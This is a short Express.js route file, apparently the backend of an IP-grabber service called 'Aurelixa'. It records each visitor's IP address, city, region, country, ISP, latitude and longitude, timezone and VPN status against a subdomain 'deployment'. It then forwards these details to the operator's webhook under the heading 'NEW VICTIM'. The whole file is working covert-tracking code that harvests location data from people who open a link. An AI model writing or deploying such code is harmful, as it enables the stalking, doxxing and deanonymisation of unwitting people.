const express = require('express');
const Deployment = require('../models/Deployment');
const axios = require('axios');
const router = express.Router();

router.post('/log/:subdomain', async (req, res) => {
  try {
    const { subdomain } = req.params;
    const { ip, city, region, country, isp, lat, lon, timezone, vpn } = req.body;

    const deployment = await Deployment.findOne({ subdomain, active: true });
    if (!deployment) {
      return res.status(404).json({ error: 'Deployment not found' });
    }

    deployment.visits++;
    deployment.ips.push({
      ip,
      city,
      region,
      country,
      isp,
      lat,
      lon,
      timezone,
      vpn,
      timestamp: new Date()
    });
    await deployment.save();

    const payload = {
      content: '🔴 **NEW VICTIM**',
      embeds: [{
        title: 'AURELIXA',
        color: vpn ? 0xff4400 : 0xff0000,
        fields: [
          { name: 'IP', value: ip, inline: true },
          { name: 'City', value: city, inline: true },
          { name: 'Region', value: region, inline: true },
          { name: 'Country', value: country, inline: true },
          { name: 'ISP', value: isp, inline: true },
          { name: 'Coords', value: `${lat}, ${lon}`, inline: true },
          { name: 'Timezone', value: timezone, inline: true },
          { name: 'VPN/Proxy', value: vpn ? '⚠️ DETECTED' : '❌ CLEAN', inline: true }
        ],
        footer: { text: `Aurelixa Platform` },
        timestamp: new Date().toISOString()
      }]
    };

    try {
      await axios.post(deployment.webhook, payload);
    } catch (e) {
      console.log('Webhook failed:', e.message);
    }

    res.json({ success: true });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;
